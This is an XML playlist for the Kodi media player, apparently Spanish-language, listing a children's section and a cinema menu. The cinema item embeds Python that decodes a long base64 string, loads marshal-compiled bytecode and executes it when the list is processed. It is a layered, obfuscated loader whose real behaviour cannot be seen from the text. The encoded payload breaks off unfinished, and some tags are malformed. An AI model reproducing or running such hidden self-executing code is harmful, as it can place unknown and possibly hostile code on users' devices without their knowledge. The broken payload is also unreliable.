<?xml version="1.0" encoding="UTF-8" standalone="yes"?>




<!--
<item>
<title>[COLOR gold]* [/COLOR][COLOR white]CONCURSO INFANTIL[/COLOR]</title>
<link>http://ignorame</link>
<thumbnail>https://i.imgur.com/5FmLwRc.jpg<thumbnail>
<fanart>https://i.imgur.com/kKmzFLe.jpg</fanart>
<externallink>https://pastebin.com/raw/DFr8Terv</externallink>
</item>

-->





<item>
<title>[COLOR gold]* [/COLOR][COLOR white]SECCION INFANTIL[/COLOR]</title>
<link>http://ignorame</link>
<thumbnail>https://i.imgur.com/L63sg0B.png<thumbnail>
<fanart>https://i.imgur.com/kKmzFLe.jpg</fanart>
<externallink>https://raw.githubusercontent.com/FESTAKIDS/festakids/main/FESTAKIDS.MENU.PRINCIPAL/ESPECIAL.NAVIDAD</externallink>
</item>


<item>
<title>[COLOR gold]* [/COLOR][COLOR white]CINE[/COLOR]</title>
<link>$doregex[c]</link>
<regex>
<name>c</name>
<listrepeat><![CDATA[
<title>[c.param1]</title>
<genre>[c.param2]</genre>
<year>[c.param3]</year>
<info>[c.param6]</info>
<link>$doregex[selecion_inteligente]</link>
<thumbnail>[c.param4]</thumbnail>
<fanart>[c.param5]</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
import re,requests,xbmc,xbmcaddon,xbmcgui,urllib2
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUJRQUFBRUFBQUFCemlRQUFBR1FBQUdRQkFHd0FBRm9BQUdRQUFHUUJBR3dCQUZvQkFHUUNBRm9DQUdRREFGb0RBR1FFQUZvRUFHUUZBRm9GQUdRR0FGb0dBR1VIQUdRSEFJTUJBR1VIQUdRSUFJTUJBQmRsQndCa0NRQ0RBUUFYWlFjQVpBb0Fnd0VBRjFvSUFHVUhBR1VKQUdVQUFHb0tBR1VIQUdRTEFJTUJBSU1CQUdRTUFHUU5BSU1EQUlNQkFBRmtBUUJUS0E0QUFBQnAvLy8vLzA1MFd4VUFBRWw1UW14aWJVNTJXa2RXYTBsSFNqVkVVVzlxU1VWYVZWSjNNRXRFVVhCd1lsaENkbU51VVdkWmJVWjZXbFJaTUV4RFFqWmlSMnhwVEVOQ2FtSXlVbXhaTTAxelNVZEtjR0p0Um5wWk1teHdSRkZ3ZEdJelNuZGhSMVl4WTNsQk9VbERZekpPVkZKb1RucHJNMDVFV1RGTmVrVXlXa1JWZDA1NlJYcE5WRmsxVGxSamVrNTZXbXhPZWxFd1dXcEthVTVVU1hwUFZGVjZUWHBaTWxwcVdURk9lazB4VGxSamQwNVVXVEpOVkZFd1RrUm5NazFxVFhkT1JFMHlUVlJhYkU1NlNURk5lbHBvVG0xRk1FMXFZM3BPUkZFd1QwUlplVTVFVVRKT2VtTXpUbXBWTVUxVVZYZE9WR2N5VDFSTk1FNUVVVEpPZWxFMVRrZFJlazlVV21oT2FtTXdUa1JSZUU1cVdUQk9SR041VFcxSmVWcHFZekpOZWtsNlRVUlZlazVxVlRCT2VtTXdUbFJOZWs1cVl6Rk9hbU42VDFSVk5FNTZSVEZaVkZGNFRsUkJlazU2VVROT2JWVXdXbFJaTVUxNldYcE5WR015VG0xSk1rNXFTbTFPZW1jelQxUktiVTV0VVRKTlZFMTZUbXBKZWs1cVdUSk9lbGw1V21wS2JVNTZhekJhYW1NeVRqSkZlazlFVFhkTmVrMTVXbXBOTkU1NlRUSmFhbVJvVG1wUk1scFVUWHBOYlZsNlRtcEthVTVxUlRKT1JGSnFUWHBOTWs1RVpHaE9lbFV3VDBSTk0wMXRTWHBQUkZwc1RtMVZlazVFU20xT1ZFRjZUMFJOZWsxdFNYbFphbGt6VG5wUk1scFVWbWhPUjAxNVdtcEtiVTF0V1RCT2FsSnNUWHByTTA1VVpHaE9hbGt6VG1wTk1VMTZaekpPYW1NeVRucFplVnBxWkdoT2VsRXlXWHBOZUUxdFdUQk9hbU42VGtkSk1rOUVXVEZOZWxsNVdtcFZNazV0VlhwT2FtTXhUWHBWTUZsNlRUQk9hbGt6VFVSa2FFNUhXWHBPZW1NelRsUlpNMDU2V21sT2JVMTZUWHBOZVUxNlFYcE9WRmw1VFhwSk1VNTZVVFJPVkZFelRtcFJlVTE2VVRGUFJGcHNUWHByTWxscVRYaE9Na1V3V1ZSU2JFMTZXVEJhYWxsNFRsZEZNMDlFV20xT2FtTXhUbnBLYlU1SFRURlpWRTB4VG1wVmVrMTZXVEZPZWtVd1RYcE5lazF0U1RCWmVsVXlUWHBKTUU1cVdYaE9SMFV3V1dwVk5FMXRXVEJQUkdNeFRucFZNVTlVVlRKTmVsRjZUa1JhYWs1VVNUQmFWRlV5VG0xRk0xbFVUVFJPVkdNelRXcE5NazE2VFRKTmVscHNUbXBSZWs1cVRUVk9iVTB5VG5wVmQwNVVhek5PYWxreVRrZFJNbHBFVW10T2FsRXlUV3BOTlUxdFdURlBSRlUxVFhwSk1scEVZekZOZW1NeFdWUk5lVTE2VlRKWlZGazBUa2RSTWxsVVl6Qk9WR2N5VGxSWk1FNUVaekJPVkZKc1RsUlJNbGxVWTNwT2JVMTZUMFJSTkU1VVl6QmFhazAwVGxSTk1GcHFXWGhPZW1zd1RtcGplRTVxUlhwTlJFcHRUbFJuTTAxRVdUQk9SRTB6VDFSTmVrNUVXVEpPYWxFd1RtMVJNVTU2VFRCTmVtTXpUVVJWZUU1cVRUTk9lbU0xVG5wTk1GcEVUVFZPYWtVeVdWUlNiRTVIUlRCWlZFMHdUbFJqZWs5RVdUUk9lbWN6VFVSTk5FNXRUVEZOYWxwb1RucEJNMDlVVlRST1JGa3hUVVJqTWsxNlRUTk9SRlpvVFhwRk0wMXFZM2hPVjBWNlRXcFZNMDE2V1hwTmVsa3pUWHBOTTAxcVkzcE9hbEV5V1dwVk0wNUhUVE5OZWxKb1RtMVZNbGxVVW0xT2VsVjZUVVJOZVU1VVp6QmFSRmt4VGxScmVrNXFTbWxOZWxVeVdWUmplVTVIVVRKWmVrMTZUa1JaZWs1cVZUTk9WR3Q1V1dwV2FFNXRSVE5PYWxVelRqSkZNazVFVm1oT1JGa3pUVVJWZWs1VVRUTlBWRTB6VG5wUk1VOVVZekJOZWtVeFRXcFZOVTVFYTNwT1ZHTXhUbXBKZWs1cVl6Uk9SMUV4VG1wU2FVNUhUVEpOZWxVelRrZFpNRTlFVW0xT2VsVXlXWHBWTVUxNmF6QlplbU41VGxSTk1sbDZVWGhPVkdjeFRucFJNazVxVFRCWmVsRXhUVzFKTVUxNlZUSk9la0V4VFhwVk5VNTZVVEpaYWxrMFRucFJlazlVWXpST2Fra3hUbFJqTUU1NlVUQlBSRlUxVG1wUmVrNXFVVEZPYlZWNlQwUlJORTU2V1RKTmFscHJUbFJKTWxscVkzZE9hbEV5VFZSTk1rNUhXVEJPUkZwb1RrUkZNMDVxVFROT1JHTXhUa1JaZVU0eVJUTk5hazE0VG0xSk1VNTZVbTFPZWxreVRrUlNhRTVxYXpKWlZGVTBUa1JuTTA1NldtMU5lbGw2VFdwU2FrNXFUVEpaYWxrMVRrZEpNMDlFVW1oT1JFMHhUbFJSZVUxNlp6Sk9SRkY1VFcxWk0wOUVZM2ROZW1jelQxUmthRTU2U1RCTmFsa3lUbnBWTVUxcVVUUk9WR3N5V1hwTk1FMTZTVEpOZW1NeVRYcE5NazFVVW1oT2JVMTZUV3BWTTA1RVNUTk5hbU4zVG0xUmVrNVVVWGxPZWxrelQxUlNhRTF0U1hwTmFscG9Ua2ROTUZscVZYaE9SMFV5V2tSYWFVNUVXVEpPYWxKc1RucEZNMDU2WTNkT2JWVXpUMVJTYWs1dFRYbFphbGw0VGtSUmVrNTZTbWxPTWtVelRtcE5NRTVxWXpCTmFtTXpUbTFKZWsxVVdtMU9SR2N5VG1wVk5VNXRXVEpPVkUwMVRucE5NazVVU21sT1ZHc3hUMVJWTkUxNlFYbFphbU4zVGtkUk1VNTZUWGxPUkVVelRXcEtiVTVVUlRCTmFrMTZUbXBOTTAxRVZYaE9hbFY1V1dwU2JVMTZWWGxaYWxGNFRYcHJNMWxVV1RSTmVtY3lUMFJTYTAxNlJUTk9hazE1VG1wTk0wMXFWWHBOYlVsNlRtcFNhRTVIV1RGTlZGVjVUWHBKTWs5VVkzcE9SRkY2VDBSTk1rMTZRVEJQUkUwMFRYcG5NVmxVV1RCTmVsVXdUVlJaZVUxNmEzcFBWRTE0VGxSak1scHFVVEZPYWxFeVRtcE5lVTE2YXpGTlZHTjVUWHBWTWs5RVZtaE9la0V5V1ZSWk1rNXFWVEZPVkZVMFRYcGpNazE2V1RGT2FtY3hUVlJOTUUxdFNUQmFSRlpvVG1wRk1FMXFWWGxPZWswelQwUk5lazVxWnpKTmFscHJUa2RGTUU1VVRYcE9SMVV6VGtSU2JVNUhSVEpQVkZVMFRtcEZNRTFxV1RWT1JHY3hUMFJWZDA1cWF6Sk5hbEV6VGtSSk0wNXFVVEpPUkdkNVdXcGFiRTVFWXpGTlJGcHRUbnBCTWxwVVVtMU9WR3N5VGtSTk5FNTZZekJOZWxKc1RtMUpNRTE2VFhwTmVrVXdUMVJSTTAxdFdUTk5WR015VGtSVk0wOVVUWGRPVjBVelRYcE5NRTE2WXpOUFZGcHBUbFJGTVU5RVRUQk9lbEV4VFhwUk0wNVVaekJhUkZVMFRYcEZNVTlFV1RCT2FtY3dXbFJTYWsxNlFUQmFhbHByVGxSck1FNVVXbXhPZWtreVQwUlJNMDVxWnpKYVZGVXdUbXBaTWs5RVl6Vk9hazB6VGxSTk1rMTZUVEZQUkZVMVRucGpNazlFVFRKT1IxRXpUa1JhYlU1SFZYcFBWR04zVGtScmVrOVVaR2hPYlVVeFRucFZNVTU2V1RKWmFsWm9UbnBCZWs1RVkzbE5la2t5VDFSUmVFNHlSVE5QUkZVd1RrUlJlazU2VVhwT2Vra3pUa1JTYUU1VVNUQlphbFpvVG5wSk0wMTZUVEZOZW1NeFRsUlZORTVFWXpCYWFrMHhUbFJCTTA5VVdUTk9SMWt6VG5wTmQwNTZTVEpaZWxFeVRtMUZNMDFxV20xT1ZGRXlUbFJWZUUxNlp6Tk5hbGw2VG1wak1FNXFUVEJPZW1jeFRtcGFhVTVIUlRKT1ZGcHRUa1JSTTA1RVZUTk9hbEV5V21wUk1FNTZaek5QUkZFeFRtcGpNazU2VlhwTmVtY3lUbnBWZDA1cVRUSlphazE2VFhwWk0wNUVXWHBOZWsxNlQxUlZlRTVVWXpKTmVsa3dUbTFKTTAxRVNtbE5lbFY2VFdwYWJVMXRXVE5QVkdONlRrUlZNRTU2V1RKT2Vsa3lUV3BOZUU1cVl6QlBSRmt4VFhwQk1FMXFaR2hOYlVrd1RWUk5NMDVxWnpOT1JFMTZUbFJqTUZwcVNtbE5lbFV4VDBSWk0wNVVZM3BQUkZVd1RXMUpNbHBxVW1oT2Fsa3dXbXBTYUU1RVNUTlpWRkpyVG5wUk1sbHFXVFJOZW1NeFRucFplRTE2UVROT1JGSnFUbFJOTUUxVVdYbE9WR3N6VDFSVmVFNVVVVE5PZWxFMFRsZEZNRTVxU21sT1ZFVXdXbFJOTlU1dFRUQlplbU15VG0xRk1GbHFWWGxPUkdzd1dXcE5ORTVxWXpCT2FrMHdUWHBWTUUxVVZUQk9ha1V5VFdwVk5FNXFaekZPYWsweVRYcFZNRTVFU21sTmVsVjZUWHBrYUUxdFdUQlBSRlV5VGtSSk0wNVVWVFZPVkVVeVdWUk5OVTU2UlhsWmFtTTBUa2ROZWs1VVRUTk9hbWN3V1hwTk1rNUhXVEpaZWxWNFRucGplazlVWkdoT2Vtc3lUMFJSZVUxdFNUQmFSRkV5VGtkVmVrMXFVVE5PUkZVd1drUmpNVTE2V1RKYVZHUm9UbFJGTVZsVVRUVk9WRUV5VGxSamVrNTZaekphVkZKdFRYcFZNMWxVWTNsT1JHc3hUV3BLYVU1RVNYcFBWRkY2VGtSWk1scEVWWGhPVkZFelRYcE5NMDVFWnpOT1ZGa3pUa2ROTWxsVVkzbE9la0V3VDFSVmQwMTZZekZOVkZWNVRucHJNMDU2VFhwT2FtTXpUa1JhYlU1RVdUSk9hazB3VG1wck1rNUVVVFZPVkVGNlRsUldhRTVFV1RGT1JGVjNUakpGTTA1NlZUUk5iVmt6VFVSV2FFNVVZekpaYW1NMFRYcE5NVTVFU20xT2VtY3dXWHBOTWsxNlRUTlBSR1JvVG0xVk1VNVVVbXBOYlVreFRWUk5lRTVVVlhwT2VrMHhUa2RWZVZscVRYZE9SRlY1V21wak1FNTZWVEJPUkZWM1RYcHJNRmxVVm1oT2Fsa3lUbXBhYkU1RVRURk5WRkV3VG5wWk1rNVVZek5PUjBsNlQxUlpNMDE2UlhwT2VtTjVUbnByTVU5VVRYaE9lazB6VG5wWmVVNTZRVEpQVkZVd1RtcFpNRnBxV1ROTmVrMHpUa1JSTVU1NldURlBWR015VFhwUk1FNXFaR2hPUjBrd1RtcFpNazU2VFRCWmVrMHhUbFJaZWs5VVdtcE9WRUV5VDFSUk1FNXFXVEpOZWxKcVRrZFpNRmxVVlhkTmVrVjZUbFJqTUU1SFVUTlBSRkpvVGxkRmVrNVVVWGhPUkdkNlRrUmplazE2V1RKTlZGSnNUbnBGTUU1RVRUUk9SMWw2VG1wWk1rMTZhekpPUkZab1RsUkZNVTFFV1hoT1ZGa3pUbnBrYUU1RVdUSmFhbU0xVG1wak1rNTZTbTFPUjFVelRrUk5ORTVFVVRKWmFtTTFUbTFGTTAxVVdUUk5lbEV4VFZSYWJFNXRWVEZQUkZsNFRXMUpNVTVVVFROT2JVVXdUbFJqZWs1cVozcE9lbEY0VGtSWmVrNXFXVFJPZWtreldWUlZNRTVVYXpKYWFsa3lUWHBWTWxsVVkzbE9ha1V3V1ZSak0wNTZaekphVkUxNFRsUlJNVTlFU21sT1ZGVXpUa1JTYWs1NlVYcE9SRmswVGpKRmVrMVVVbWhPUjFWNlRYcFpOVTU2YXpKTmVrMDBUbnByTUU5RVVUQk9hazB5VFhwVk0wNXFSVEJQVkZGNlRXMUpNbGw2VlRCT2VtY3pUVVJqZVUxNmF6Qk5hbU4zVG0xVk1GcEVVVFJOYlZrd1drUmpNazVFVFRKUFJFMHdUbXByTUU1RVl6Qk9SR014VFVSak1rNUhTWHBQUkZsNlRucFpNRnBxWTNkT2Vsa3lUbnBSTlU1VVkzcE9SRkpyVG1wWmVrOVVVVFZPZW1zd1QwUlJNMDE2WXpGT2Fsa3hUbnBuTWs1RVZUTk9hbFY1V21wUk1VNHlSWGxaYWxWNVRrUm5lazlFVVhsT2Fsa3hUa1JWTkU1dFJUQlBWRkp0VFhwQk1FNVVXWHBPYlZrelRsUmthRTV0UlROT2FsSnNUbFJaTUZsNlVUVk5la0V6VGtSTmQwNUVTWGxhYWsxNVRsUkJNRmxVVFRWTmJVa3pUVlJOZWs1Nll6QmFWRkpzVGtkSk0wNTZVbXBOYlVreVdWUmFhRTV0U1RKUFJFcHRUbXBqTUU1cVNtbE5iVWt4V1ZSWmVrNTZaekJPUkZVMFRrUlZNMDVVV1RCT2Ftc3dUWHBTYWsxdFNUQk9SRTAwVGtSak1scFVXbTFPZWxVd1RucFJlVTE2YTNwTmFrMTVUa2RGZWs5VVl6Uk9iVWw1V21wV2FFNUhSVEJQUkZab1RrUlpNVTFFU21sT1JGa3lUbXBTYTAxdFNUQmFSRTEzVFhwUk1VNVVVbXhPUjBVd1dtcE5ORTVIU1RKT2FsazFUa1JSZWsxNlZYbE9SRkV5VG1wWk5FNUVaM2xhYWxVMFRrZE5lazVFVW1wT2JVVXhUbFJhYVU1NldUSlpWRkY2VGxSbk1VMVVWWHBOZWtFelQxUlpNVTVVVFhwUFZGSm9Ua1JSTTA1VVRYbE9SMGt5VFhwU2EwNHlSVEJOVkZWM1RXMVpNMDE2VVRCT01rVXlUWHBLYlU1dFdURk9SRmt5VGxSVk1WbFVWVEJPYWsweVdtcFJlRTF0V1RCUFZGVTFUWHBSTWs5VVdUSk9iVTB3VG5wU2JVNTZhekpPVkZWNlRrUm5lazlFVVRGTmJWa3dUbnBaTUU1VVNURk9ha3B0VGxSck1VOUVXVEpPUjBVelRWUlNiVTVVYXpOUFJGcHNUbTFOZWsxVVdUTk9SRWw2VGxSUmVVNVVVVE5OVkZKdFRrZE5NbHBVVFhsT2JVbDZUa1JXYUUxdFdYcE5hbHBwVFhwTk0wMTZVbWxPYWsweVRYcE5NVTE2YXpCTmFsa3hUa1JqTUU5VVRUUk9iVWw1V21wVk0wNVVXVEpOVkZVd1RqSkZlazE2V1hoTmVtY3dXa1JLYVU1cVJUSk5lbFY0VG0xTk1scFVWVFZPZWxGNVdtcFNhRTU2V1RKWmFsSm9Ua2RWZVZscVZUVk9SR014VFhwU2JFMXRTWHBPYWxGNlRtMUpNVTVFVVROT2FsbDZUMVJaTTA1NmEzcE9WR00wVGtSWk1GcHFXWHBPYW1jd1dsUk5NVTV0V1RGT2FrMHdUbnBuTTAxcVRYZE9SRTB5V2xSak1VNUhUVEpPUkZwdFRucEplazU2V1ROT2Vsa3pUbnBOZUU1RVVUQmFWRXBwVG1wSk1scFVXVFJPVkdjelQwUlJlRTE2WXpKUFZGSnBUbTFWZWsxcVdUVk9SMVV3VG5wYWFVNXFXWHBPUkZGNFRsUkJlazlFVFhkT01rVjZUMFJWTlU1VVdUTlBWRkY0VG0xVk1scEVTbTFPZWtFeVQxUk5lazVIUlRGTmVsRXpUbXByTWs1NlRYaE5la1V3VFhwU2FrNXRUVEpQVkZFMFRucFZNRmw2VW1oT2FtY3lXbFJSTTA1NlVUQlphbEpxVGtSVk1VMUVTbTFPVkVreldWUk5lVTVVUVRGT1ZFMHlUbnByTVU1cVVUUk9SR2N3VFZSWk1FNXFUVEJOVkdNeVRYcGpNVTlVWXpKTmVtTXlUbnBSZWsxNlozcE5lbGswVGxSQmVrMXFVWGxOYlZrelQwUmpkMDE2VFRCTmFsSnRUbnBqTUZsVVVteE9hbU16VFhwS2JVNTZRVE5PUkUwMFRucGpNVTVFV21sTmVtTXpUMFJSZVU1SFdUSk9hbGt6VGxSQk1VNTZZelZPVkVWNlRtcE5lVTU2V1ROT1ZGSm9UbnBuTVU1NlRUVk9lazB3VFZSU2EwNVVXVEZOUkdNMVRsUlJNMDFFVVROTmVtY3dUMFJOTTA1NmF6QlplbGsxVGxSck1VNUVTbTFPYWxVeVdYcE5lVTVxWXpKT1JHTTFUbXBOTVUxcVdtdE5lbU13V2tSVk1rMTZZekJPUkZwb1RXMUpNbGw2WXpKT1IxRXlUbFJWZUUxNlVUSk5hbHByVG5wWk1sbDZVbXRPZW1zelRXcEthVTVxWXpKT2VrMHlUbXBKZWs5RVZYaE9lbXQ2VG1wUk0wNVVaekphVkZreVRsUmpNbHBxV1hoT1Iwa3dXbFJLYlU1RVVYbGFhbHBvVGxSck0wMVVTbTFPUkZrelRtcE5lRTR5UlROTmFtTXlUbFJOTTAxNlRYaE9iVmt5VG5wamQwNVVRWHBPYWxrMFRsUlplVnBxVW1oT2VrRXhUVVJLYVU1NlRUQmFSRTB3VFhwak1FNVVWWGROZWxVd1dsUmpNazE2UlRCTmFrMTZUbFJGTTA1RVVtbE5lbU16V1ZSU2JFMTZSVEJQUkUwMFRsUk5lazlFVVhsT2VtY3dUV3BLYlU1NlJURk9lbGt5VGxSRk1VMVVWWGxOYlVreVdrUmFiRTE2UVRCTlZFcHBUWHBSTUZsVVVtdE5lbFV3VFZSTmVrNUVhekJPVkUxNVRtMUZlVnBxV1RWT1IxRXhUVVJTYTA1SFVYcE9WRlV6VFhwbk1sbFVXVEJPVkVVd1drUktiVTVIU1RCTmFtUm9UbnByTVU1cVdUSk9WRUV5VGxSWk5FMTZXWHBQUkZKc1RucEJNRTVVV1RKT1JGa3dUa1JXYUU1cVZYcE5hbFY2VGxSUmVrOVVXVFZOZWswd1QxUlZNRTU2VFROUFJHTjNUa2RGTTA5VVdtdE9ha1V5V1hwTk0wNTZRVEZPZWxFd1RrZFpNMDU2V1RKT2Ftc3dUMVJTYlU1RVl6TlpWRnBzVFhwbk1FMVVZekpPUkdzelRXcEthVTVFVFhwUFZGazBUbFJaZVZwcVVUVk9iVkY2VFhwYWFVNUVhek5aVkUxM1RrUlZlazlFVlhoTmJWbDZUbXBSZVUxdFdUQlBWRlUwVG5wbk0wNUVUWGxPYWtVelRsUmFiVTF0U1ROUFZGRjRUWHBuTWsxNlVYbE9WRlY1V1dwVmVFMTZZM3BOVkZVeVRqSkZNazlVVFRST1IwVXpUMVJSTWs1VVFYcFBSRmw2VG1wTmVrOVVXbWhPYWxrelRYcFJlazE2YXpCYVZGRjZUbnBWTVUxcVkzaE9WRlY2VFhwTk1VNXFhM2xaYWsweVRYcEJNbGxxVFRST1IxRXlUbFJqTUU1VVJUSk9SR016VGtkTk1rOUVVbWhPUjFsMFd4VUFBRzFCZDBoc1ducFdNRUZ0UkRGQmQwd3dXbmRFYlZwdFZqSk5VVVYxUVhkU01VSkhWM1pCVkVSdFdsRndOVUZSZEROTVIwUTFRWGRFTUVKSFYzcEJiVTVzVFhkYU5FRXlVak5CZDFkMlFWUmFiVUpIY0d0QmJVZ3hXbmRJTVZwdGNEQk1kMHd6V20xYU0wSlJUWFphZWt3d1FrZE5kMEZIZERKYWJVUXdXbnBXTUV4dFJERkJkM1F4V25kWGRrRjNlREZDVVV3d1FWRkliVnBIV21wQmQzQXpRVkZhTWtGUldqSkJSMGhyUVhwU01rSkhSRE5CVVhCdFduZE1NVnB0ZURKTmQzQXdRWGRhTVZwdGNHMUJSMGd3VEVkTmVGcDZUREpNZDBSc1dtMXdiVUYzUlhwQlZFUnNUWGROZDBGSFRqTkNSMHd5UVVkT01rRnRSWGxhYlVRelRFZGFNMEZ0U0RGTVIzQTBRVWRNYkUxM1NHeGFiVm94UVcxSWFrRlVWakJCZDFkMlFYcFNNbHAzU0RCQlVWb3pRWGROZWtGVVdteE5kM0YxUVVkT01FSlJTRE5CYlV3eVdrZE1OVUZ0VGpGQ1VWb3dRVkYwYlZwUmNYVmFiVXd4V2tkTU1rRnRlRE5CYlhGMVFYcFNNazFSVEd4QmVrUXlRa2RJYWtGdGVEQk5VVXh0UVVkU01rMUhjRFZCVVZJelFYZE5kMEYzVW14TmQzQTBRWHBJTTFwSFNEQkJkMHd5UVcxTmRWcHRjRE5DUjB3MFFYcElNMEZIVFhwYWJVUXdURzFhYTBGSFRteE1kMGh0UVZGd2JFMTNTREZCZWtneVRHMUZka0V5VWpOQmQwVjVRVkYwYlZwdGNHeEJkMHd3VEhkSU1FRjZVakpDUjNBeFducFdNRTFSY0cxQlNsSXhRVkZhTlZwdGRERk1SMGhxUVRKU01rRkhUWFpCZDBReFdrZHdOVnA2VEcxQmJVUXlRVkYwTWt4dFJETkJSMUl5V25kTmRVRlJTREpCZDBWMlFUSlNNRTEzU0ROQlIwNXRXbmROZDBGUlNEQk5VWEExUVRKU01reDNSWGhCZDB3eVRFZEViRUZ0VEROYVIwaHFRWHBFTUVKSFRERkJla1F6V20xYWJVRkhTREZDVVV4dFdtMU1iVUZSVEd4YWJYZ3dUWGROZVVGNldqQk5SMW8xUVZSSWJVRkhXakJCVVhBeFdsRkZlVUZSVERKYWQxcHRRVkYwTWtGM1JYaEJlbEl4UVVkWGRrRkhjREpCVVhCcVFWUmFiRXgzVFhoQmJVd3hRVkZGZGtGUmREQkJkMFY0UVcxd01FeHRSREZCVVZKc1RIZHdORUZ0VEcxQmJVVjNRVzFNTWsxSFNYVkJiVll3UWxGWGVrRlJTREZCVVUxM1FVZGFNRnB0U0dwQmJVUXlRbEZ3YkVGNlZqSkJVVm96UVVkU01rSlJXakpCU2xJeVRHMWFNa0ZSVmpOQmQwUXpXbTFhTUUxSFYzWmFiWGd3UVVkRU0xcDZUREphYlhBMFFWRkVNbHBIUlhoYWJYUXlURWRNYlVFeVVqTkJVVVYxV25wV2JWcEhSWFZCYlhReVRHMUlORUY2UkRKQlVWbzBRWHBNYkUxM1JYVkJSMFF5UVcxd2JFRlJjREpNUjBodFFYcEVNa0YzY0RCQmQzQXpURWRNYTBGVVdteE5kMDEzUVZSRWJWcEhUR3hhYlZJeFdrZHdNMEZ0Vm14TWQwMTZXbTFTYlZwSFJYZEJlbG94UVhkYU5VRlJVak5CZDFveFFVZEVNMEYzY0RWQlIweHNUWGROZDFwdFdqRkJVVWd3V20xYU0wSkhXbTFCZWtReFduZFhka0ZSV2pGYVVVMTZRVWRPTUVGUmNERmFiVll5VEVkSU1scDZUREpNYlVodFFXMU1NRXh0V214QmVrd3hXbEZFTlVGNlVtMUJSMXB0UVhkU2JVSlJWM3BhZWt4c1RYZEliRUZ0ZEROQmQxcHJRVzF3TTBGM1JEUkJiWEF4V2xGRmQwRjNjRzFCYlVSdFFXMU1Na0Z0Y0cxYWJVUXpXbmRGZDBGUlNERmFiVm8wUVZSSU1FRnRjRFJhYlU0elFrZGFOVnB0VGpKYWQwaHJRVWQwYlZwUlNEVkJiVll4UWxGRWJFRnRWakZhYlVWM1FYZElNVXhIU0ROQmQxSnRRWGR3TUVGdFRqSmFSMW96UVRKU00xcHRSWGhCVkZKdFFrZE5lVUYzVmpOYWQzQTFXbTFPTTB4SFJYWmFiVll6UVVkd01FRkhTRzFCUjNBeVFYZEVNVUYzV2pGQmQzUXlRVzF3TlVGUlJESkJSMGd5UVhwTWJWcHRjRFJCZDNnd1RHMWFha0ZVU0RCTlVYQXlXbTE0TTBGdFJEQkJla3h0UVVkSU0wRlJkREZCYlUxMVFXMU9iVnAzUkROQmQzQXhRVzFYZWtGSGNEQkNVVVExUVVkRU0wRkhjREpCYlVRd1RYZHdiRUZSVWpGQmJVVjNRWGQwTUZwM1RYZEJkMFF4UWtkTU1rRlVVak5CVVZveFFXMVdNVUYzY0RCYWJWSXlURWRJTkVGUlJHMUJkM0J0UVZSRU1scEhURE5CUjNReVduZE5lRUZ0VGpGQ1IwUTFXbnBNTWxwSGNEQkJkMVl4VEVkSWFrRjZTRE5hVVVoc1dtMWFNVUZ0VERSYWJVUXdRVzFFYkVGdFRHMUNSMFExUVhkU01VRkhXbTFhYlU0eFduZGFiRUZ0VERKTVIwd3dRWGR3TWt4SFdqTkJiWFF6V20xRmVrRlJlREZCUjFveVdtMVNZVkZFWXpCd2VubG9ia3RGTlZaUk1IUlhNRUZ1UVhveFZrMUpjVWxhVVZkbmNsUnhUVTFLU1U5d1ZEaHNRVEZCVWtWNGRETkdkM1ZyV0cxWGRrcEtTV0p1ZG1kNlIzcG1iVmd3ZVRWRWJYVmliM2xPTTBreWNHcHdNR05MUWtoaU1FZGhRV2R4VkRGMVFWTmlORWg0Wm1WRU1uRlNjRWxCZUZwTGNXMXlVamhsY0VoclJVUktZMWROTWpWblJFZzBNVXBKUkRKSlNraGxSRW8xYVhKNFUwZE5TMDB3VFdGU01VaFRlWGhJVVhGVVFUQmpSMEY2YTBWd2VEbExSWGxKVlUxSFNWUnVTV05SUVdGak0wVXlhMUZHZUVreVJuaEJSbkIzU1dkd1VVUnNiMGhYZWtwTFRVVkViRGxQUmpBMVNWa3pUMkZGVW5CcFRIcE5SSEpVVTFGd2QwOTJUVXBqUTBGdFJHMWFNbE5hUlVablVYQlVWMUJ3VkZkQldESTBNa0ZIVTFGRmQwUnJTRWxJTlVWVFVqRk1lV05RVEV0NE5XOVRTV0p4TVVWUlNUSmpTVzVMVjBod1ZXTjViakJxTkVjd1dtdEVNRFZhUVhkQk5rZ3pXakp4U0ZveWNWSm5aRTEzVFRKTVIzVnVTa2xXYlc0eWVYWnZkM1YzVFRBNGJVd3pUVkZhYlhsRWNubEplRWQ0Y1VWdlNFbEZTRVpuUWtwSVZ6SkNTRFUyUVhkSk5FVkhXbXhCZWxkSlNIbGpaa2hoVDBOd01IVkVibFJYVDNCaFJWRkdlVUZ0U0d4bmJFaDZWME5HYlhGM1IwZFBTVmd5TkdwTU0zVm5URWhYTVVsS01XRkpWVmRZUjJGVGEwY3hTVmxhU2t4clFYbEpXa0pIVFVSQ1NIZzBUV0ZQWTBFeFNVdEVNbmt5Y2tsVFkzRlZRVkZ1U0UxYVFXMU5kMXBIVnpKWk0za3hjVEl4U1VkVVozbHhVMGd6UjBsVFNVVjRRVFJhVVZkRFdXMVdiRUY0WTFaSmJEazJSek54YUc0elNXbFliVTlGUVVkT01WcFZVM2hGZUdkcVRUSjFSSEF5UVdkd00wRllTRlZTTTBsSlJXeHZlRTAyY0VwalZrRXlSVnBKU0d0MlRURkZVRUV3Vm14RmQwRnFjRWxUWW05UU9WbHZSamw0UmtkNVZIQjVSRzFCTWsxMWIzcDFSMGxWUkcxWk1uRjJTbFZCZGxwNmRERmFNM1F4Y25wWFVFMWhWbXR2TWxwc1JsSkJhVzlJUVRaWk1uRlpTbnBUWTI5SVYxQk1ZWGxoU1VweE5rMUlUVVZGYlhocFRVb3hhbkY2VFVsYWVFbElSVVk1VVhGaFdteEllWEZsUlcxNGEwZHRTV0pCVVZKcFdqSTVWMFl3VEd4dlUyTkRjbmd4ZUc5M2VETkhSMW8wUVZWYU5XNUxjREJ3TTNGWWNFZFhNMEV4Y1haQk1ubFhSRWxqYWtaVlkyaHdTbmx0Y2xSME5VZFZWMnhCUjNGdFNWQm1hVVl5TkdWSVNqUnJjRlZKU25CNmNUTkpNbU13U25oWFowcFRTRFZOVVVsWWIwWm5lbkIyT1ZOQlUwOVZRV0ZCVTBVeFkxQnlTMUpyUWtkTlRGcEhTV3hKU1hCdFNucDVUVWhWY0dsS1VsY3pTVWg0TVc5VmRXZHdNM2xyUVRCVE5rRkxXbTFCU0VsaGNsTnhURmd4ZVdsSFNIRk1SRE4xVUVoNlUxUndTRGxKUVVoSWJFRXlPV1Z3VkZacWNETm